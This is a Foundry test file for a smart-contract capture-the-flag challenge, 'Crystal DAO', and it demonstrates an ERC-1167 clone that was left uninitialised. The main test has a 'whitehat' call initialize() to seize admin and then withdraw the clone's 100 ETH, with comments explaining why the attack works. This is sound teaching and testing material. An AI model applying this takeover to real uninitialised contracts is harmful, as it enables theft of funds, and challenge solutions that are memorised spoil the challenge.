// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {CrystalTreasuryImpl, CrystalTreasuryFactory} from "../src/challenge7/CrystalDAO.sol";

/// @title Challenge 7: Crystal DAO – Rescue Test
/// @notice Demonstrates the ERC-1167 uninitialised clone vulnerability.
///
/// ─── Setup ────────────────────────────────────────────────────────────────────
///   - whitehat address controls execution (0 initial ETH as per challenge rules)
///   - The factory deploys a clone but never calls initialize()
///   - 100 ETH is loaded into the clone (simulates the "reached 100 ETH" condition)
///
/// ─── Attack Vector ────────────────────────────────────────────────────────────
///   1. clone.initialize(whitehat) — sets admin to whitehat (slot 0 was address(0))
///   2. clone.withdraw(whitehat, 100 ether) — drains the treasury
///
/// ─── Why This Works ──────────────────────────────────────────────────────────
///   The CrystalTreasuryImpl constructor runs in the IMPLEMENTATION's storage
///   context, not the clone's. The clone's storage starts zeroed (_initialized = false,
///   admin = address(0)). Because the factory never calls initialize() on the clone,
///   the unprotected initializer is open to anyone.
///
contract Challenge7Test is Test {
    address internal whitehat = makeAddr("whitehat");
    CrystalTreasuryFactory internal factory;
    CrystalTreasuryImpl internal clone;

    function setUp() public {
        // Deploy the factory (this also deploys the implementation)
        factory = new CrystalTreasuryFactory();

        // Simulate the DAO admin deploying a treasury clone (without calling initialize)
        address cloneAddr = factory.deployTreasury();
        clone = CrystalTreasuryImpl(payable(cloneAddr));

        // Fund the clone with 100 ETH (the "reached target" condition)
        vm.deal(address(clone), 100 ether);

        // Whitehat starts with 0 ETH (as per challenge rules)
        assertEq(whitehat.balance, 0, "whitehat should start with 0 ETH");
        assertEq(address(clone).balance, 100 ether, "clone should hold 100 ETH");
    }

    // ─── Vulnerability Demonstration ─────────────────────────────────────────

    function test_Challenge7_CloneAdminIsZero() public view {
        // The implementation's admin is the factory deployer (set in constructor)
        assertNotEq(CrystalTreasuryImpl(payable(factory.implementation())).admin(), address(0));

        // But the CLONE's admin is address(0) — the bug
        assertEq(clone.admin(), address(0), "clone admin should be uninitialized (address(0))");
    }

    function test_Challenge7_InitializeIsOpen() public {
        // Anyone can call initialize() on the uninitialized clone
        vm.prank(whitehat);
        clone.initialize(whitehat);
        assertEq(clone.admin(), whitehat, "whitehat should now be admin of the clone");
    }

    // ─── The Rescue ───────────────────────────────────────────────────────────

    /// @notice Full rescue: whitehat takes over the clone and drains 100 ETH.
    function test_Challenge7_Rescue100ETH() public {
        console.log("=== Crystal DAO Challenge 7: Rescue ===");
        console.log("Clone address:    ", address(clone));
        console.log("Clone admin (before):", clone.admin());
        console.log("Clone ETH balance:", address(clone).balance);
        console.log("Whitehat balance (before):", whitehat.balance);

        // Step 1: Initialize the clone with whitehat as admin
        // This works because:
        //   - _initialized is false (clone storage starts zeroed)
        //   - admin is address(0) (clone storage starts zeroed)
        //   - The factory NEVER called initialize() on the clone
        vm.prank(whitehat);
        clone.initialize(whitehat);

        console.log("Clone admin (after init):", clone.admin());

        // Step 2: Withdraw all 100 ETH to whitehat
        vm.prank(whitehat);
        clone.withdraw(payable(whitehat), 100 ether);

        console.log("Whitehat balance (after):", whitehat.balance);
        console.log("Clone ETH balance (after):", address(clone).balance);

        // ── Assertions ────────────────────────────────────────────────────────

        // Primary objective: rescue 100 ETH
        assertEq(whitehat.balance, 100 ether, "whitehat must hold 100 ETH");

        // Secondary checks
        assertEq(address(clone).balance, 0, "clone must be fully drained");
        assertEq(clone.admin(), whitehat, "whitehat is now the admin");
    }

    // ─── Edge Case: Original DAO admin cannot call withdraw ──────────────────

    function test_Challenge7_OriginalAdmin_CannotWithdraw() public {
        // The DAO admin who deployed the treasury via the factory is NOT the clone's admin
        // (admin == address(0) in the clone). So any call from the "real" admin reverts.
        address daoAdmin = makeAddr("daoAdmin");
        vm.prank(daoAdmin);
        vm.expectRevert(CrystalTreasuryImpl.NotAdmin.selector);
        clone.withdraw(payable(daoAdmin), 100 ether);
    }

    // ─── Double-Initialize Prevention ─────────────────────────────────────────

    function test_Challenge7_CannotReinitializeAfterRescue() public {
        // Whitehat initializes
        vm.prank(whitehat);
        clone.initialize(whitehat);

        // Attacker tries to reinitialize after the fact
        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        vm.expectRevert(CrystalTreasuryImpl.AlreadyInitialized.selector);
        clone.initialize(attacker);
    }
}
